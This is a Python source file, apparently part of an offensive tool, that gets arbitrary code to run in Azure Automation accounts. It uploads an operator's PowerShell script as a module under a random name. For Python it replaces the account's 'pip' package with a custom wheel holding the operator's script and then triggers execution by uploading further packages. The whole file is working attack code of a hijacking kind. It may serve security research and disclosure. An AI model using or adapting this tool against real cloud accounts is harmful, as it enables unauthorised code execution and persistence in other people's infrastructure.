



import os
import time
import uuid
import shutil
from abc import ABC, abstractmethod

import file_utils
from azure_automation_session import UPLOAD_STATE, UPLOAD_TIMEOUT, AzureAutomationSession


class ScriptExecutor(ABC):

    EXTENSION: str
    NAME: str

    def __init__(self, automation_session: AzureAutomationSession) -> None:
        super().__init__()
        self.automation_session = automation_session

    @abstractmethod
    def execute_script(script_path: str, count: int):
        pass


class PowershellScriptExecutor(ScriptExecutor):

    EXTENSION = ".ps1"
    NAME = "Powershell"

    def __init__(self, automation_session: AzureAutomationSession) -> None:
        super().__init__(automation_session)

    def execute_script(self, script_path: str, count: int):
        print(f"[*] Attempting to execute the Powershell script {count} times:")
        for index in range(count):
            print(f"[*] Triggering Powershell execution - {index+1}/{count}")
            module_name = str(uuid.uuid4())
            zipped_module_path = file_utils.zip_file(script_path, f"{module_name}.psm1")
            blob_storage_uri = self.automation_session.upload_file_to_temp_storage(zipped_module_path)
            self.automation_session.upload_powershell_module(module_name, blob_storage_uri)
            print(f"\t[*] Waiting for code execution...")
            time.sleep(0.1)


class PythonScriptExecutor(ScriptExecutor):

    EXTENSION = ".py"
    NAME = "Python"
    PIP_PACKAGE_NAME = "pip"

    def __init__(self, automation_session: AzureAutomationSession) -> None:
        super().__init__(automation_session)

    def _wait_for_package_upload(self, package_name: str, timeout_seconds: int = UPLOAD_TIMEOUT):
        end_time = time.time() + timeout_seconds
        while time.time() < end_time:
            package_data = self.automation_session.get_python_package(package_name)
            upload_state = package_data["properties"]["provisioningState"]         
            if upload_state == UPLOAD_STATE.SUCCEEDED:
                break
            elif upload_state == UPLOAD_STATE.FAILED:
                raise Exception("Python package upload failed. Error: ", package_data["properties"]["error"]["message"])
            else:
                print(f"\t[*] Upload state - '{upload_state}'")
                time.sleep(15)
        else:
            raise Exception("Python package upload failed due to timeout")
        

    def execute_script(self, script_path: str, count: int):
        package_path = os.path.join(file_utils.ROOT_DIRECTORY, "resources", "custom_pip")
        main_file_path = os.path.join(package_path, "src", "pip", "main.py")
        shutil.copyfile(script_path, main_file_path)
        
        whl_path = file_utils.package_to_whl(package_path)
        
        print(f"[+] whl file successfully created - '{os.path.basename(whl_path)}'")
        
        blob_storage_uri = self.automation_session.upload_file_to_temp_storage(whl_path)
        self.automation_session.upload_python_package(PythonScriptExecutor.PIP_PACKAGE_NAME, blob_storage_uri)
        
        self._wait_for_package_upload(PythonScriptExecutor.PIP_PACKAGE_NAME)

        print("[+] Successfully replaced the pip package!")

        print(f"[*] Attempting to execute the Python script {count} times:")
        for index in range(count):
            print(f"[*] Triggering Python execution - {index+1}/{count}")
            package_name = str(uuid.uuid4())
            blob_storage_uri = self.automation_session.upload_file_to_temp_storage(whl_path)
            self.automation_session.upload_python_package(package_name, blob_storage_uri)
            print(f"\t[*] Waiting for code execution...")
            time.sleep(0.1)